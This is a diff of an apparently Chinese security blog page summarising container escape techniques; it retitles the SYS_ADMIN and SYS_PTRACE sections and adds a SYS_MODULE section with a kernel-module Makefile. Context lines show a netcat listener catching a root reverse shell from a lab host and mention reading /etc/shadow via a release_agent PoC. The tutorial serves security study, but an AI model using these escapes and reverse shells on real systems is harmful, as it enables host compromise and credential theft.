@@ -28,7 +28,7 @@
 <meta property="og:description" content="谷神不死，是谓玄牝，玄牝之门，是谓天地根。  容器逃逸相关手法总结">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-27T07:27:12.000Z">
-<meta property="article:modified_time" content="2021-12-29T11:53:24.663Z">
+<meta property="article:modified_time" content="2021-12-31T03:11:47.417Z">
 <meta property="article:author" content="c哥">
 <meta property="article:tag" content="容器安全">
 <meta name="twitter:card" content="summary">
@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-29 19:53:24" itemprop="dateModified" datetime="2021-12-29T19:53:24+08:00">2021-12-29</time>
+                <time title="修改时间：2021-12-31 11:11:47" itemprop="dateModified" datetime="2021-12-31T11:11:47+08:00">2021-12-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -479,7 +479,7 @@
 <p>结果：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:44584.</span><br><span class="line">root@bf0b7fcd75d1:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<h3 id="5-4-通过SYS-ADMIN特权逃逸"><a href="#5-4-通过SYS-ADMIN特权逃逸" class="headerlink" title="5.4 通过SYS_ADMIN特权逃逸"></a>5.4 通过SYS_ADMIN特权逃逸</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--cap-add</span>=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span><br></pre></td></tr></table></figure>
+<h3 id="5-4-通过SYS-ADMIN逃逸"><a href="#5-4-通过SYS-ADMIN逃逸" class="headerlink" title="5.4 通过SYS_ADMIN逃逸"></a>5.4 通过SYS_ADMIN逃逸</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--cap-add</span>=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">poc</a>: release_agent.sh</p>
 <p>修改为<code>cat /etc/shadow</code></p>
@@ -502,7 +502,7 @@
 
 
 
-<h3 id="5-5-通过SYS-PTRACE特权逃逸"><a href="#5-5-通过SYS-PTRACE特权逃逸" class="headerlink" title="5.5 通过SYS_PTRACE特权逃逸"></a>5.5 通过SYS_PTRACE特权逃逸</h3><p>攻击机器：172.16.42.100</p>
+<h3 id="5-5-通过SYS-PTRACE逃逸"><a href="#5-5-通过SYS-PTRACE逃逸" class="headerlink" title="5.5 通过SYS_PTRACE逃逸"></a>5.5 通过SYS_PTRACE逃逸</h3><p>攻击机器：172.16.42.100</p>
 <p>靶机：172.16.42.151</p>
 <p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
 <p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
@@ -537,6 +537,45 @@
 
 <p> 结果：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-6-通过SYS-MODULE逃逸"><a href="#5-6-通过SYS-MODULE逃逸" class="headerlink" title="5.6 通过SYS_MODULE逃逸"></a>5.6 通过SYS_MODULE逃逸</h3><p>Makefile:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m :=exp.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KDIR :=/lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -643,7 +682,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%AE%B9%E5%99%A8%E8%AF%86%E5%88%AB"><span class="nav-text">1.1 容器识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E8%AF%86%E5%88%AB"><span class="nav-text">1.2 特权容器识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%94%B6%E9%9B%86%E6%8C%82%E8%BD%BD%E4%BF%A1%E6%81%AF"><span class="nav-text">1.3 收集挂载信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%94%B6%E9%9B%86%E7%89%B9%E6%9D%83%E4%BF%A1%E6%81%AF"><span class="nav-text">1.4 收集特权信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%89%BE%E5%88%B0%E5%AE%B9%E5%99%A8%E5%9C%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="nav-text">1.5 找到容器在宿主机的根目录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%89%B9%E6%AE%8A%E8%B7%AF%E5%BE%84%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">2. 特殊路径挂载导致的容器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E9%80%9A%E8%BF%87%E6%8C%82%E8%BD%BD%E7%9A%84root%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">2.1 通过挂载的root目录进行逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%8C%82%E8%BD%BDDocker-Socket%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">2.2 挂载Docker Socket的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%8C%82%E8%BD%BDprocfs%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">2.3 挂载procfs的情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">3. 通过特权容器逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">4. 利用程序漏洞进行逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6"><span class="nav-text">4.1 容器运行时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-runC"><span class="nav-text">4.2 runC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="nav-text">4.3 CVE-2019-5736 runc容器逃逸漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%80%BB%E7%BB%93"><span class="nav-text">4.4 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%80%9A%E8%BF%87Capabilities%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">5. 通过Capabilities进行逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E7%90%86%E8%A7%A3linux-Capabilities"><span class="nav-text">5.1 理解linux Capabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-Docker%E4%B8%AD%E7%9A%84Capabilities"><span class="nav-text">5.2 Docker中的Capabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%88%A9%E7%94%A8%E5%AE%8C%E5%85%A8%E7%89%B9%E6%9D%83%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">5.3 利用完全特权进行逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%80%9A%E8%BF%87SYS-ADMIN%E7%89%B9%E6%9D%83%E9%80%83%E9%80%B8"><span class="nav-text">5.4 通过SYS_ADMIN特权逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E9%80%9A%E8%BF%87SYS-PTRACE%E7%89%B9%E6%9D%83%E9%80%83%E9%80%B8"><span class="nav-text">5.5 通过SYS_PTRACE特权逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%AE%B9%E5%99%A8%E8%AF%86%E5%88%AB"><span class="nav-text">1.1 容器识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E8%AF%86%E5%88%AB"><span class="nav-text">1.2 特权容器识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%94%B6%E9%9B%86%E6%8C%82%E8%BD%BD%E4%BF%A1%E6%81%AF"><span class="nav-text">1.3 收集挂载信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%94%B6%E9%9B%86%E7%89%B9%E6%9D%83%E4%BF%A1%E6%81%AF"><span class="nav-text">1.4 收集特权信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%89%BE%E5%88%B0%E5%AE%B9%E5%99%A8%E5%9C%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="nav-text">1.5 找到容器在宿主机的根目录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%89%B9%E6%AE%8A%E8%B7%AF%E5%BE%84%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">2. 特殊路径挂载导致的容器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E9%80%9A%E8%BF%87%E6%8C%82%E8%BD%BD%E7%9A%84root%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">2.1 通过挂载的root目录进行逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%8C%82%E8%BD%BDDocker-Socket%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">2.2 挂载Docker Socket的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%8C%82%E8%BD%BDprocfs%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">2.3 挂载procfs的情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">3. 通过特权容器逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">4. 利用程序漏洞进行逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6"><span class="nav-text">4.1 容器运行时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-runC"><span class="nav-text">4.2 runC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="nav-text">4.3 CVE-2019-5736 runc容器逃逸漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%80%BB%E7%BB%93"><span class="nav-text">4.4 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%80%9A%E8%BF%87Capabilities%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">5. 通过Capabilities进行逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E7%90%86%E8%A7%A3linux-Capabilities"><span class="nav-text">5.1 理解linux Capabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-Docker%E4%B8%AD%E7%9A%84Capabilities"><span class="nav-text">5.2 Docker中的Capabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%88%A9%E7%94%A8%E5%AE%8C%E5%85%A8%E7%89%B9%E6%9D%83%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">5.3 利用完全特权进行逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%80%9A%E8%BF%87SYS-ADMIN%E9%80%83%E9%80%B8"><span class="nav-text">5.4 通过SYS_ADMIN逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E9%80%9A%E8%BF%87SYS-PTRACE%E9%80%83%E9%80%B8"><span class="nav-text">5.5 通过SYS_PTRACE逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-6-%E9%80%9A%E8%BF%87SYS-MODULE%E9%80%83%E9%80%B8"><span class="nav-text">5.6 通过SYS_MODULE逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -697,6 +736,9 @@
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://blog.svip.dev/" title="https:&#x2F;&#x2F;blog.svip.dev&#x2F;" rel="noopener" target="_blank">Pluto</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://39.108.133.111/wiki/" title="http:&#x2F;&#x2F;39.108.133.111&#x2F;wiki&#x2F;" rel="noopener" target="_blank">Zii</a>
         </li>
     </ul>
   </div>
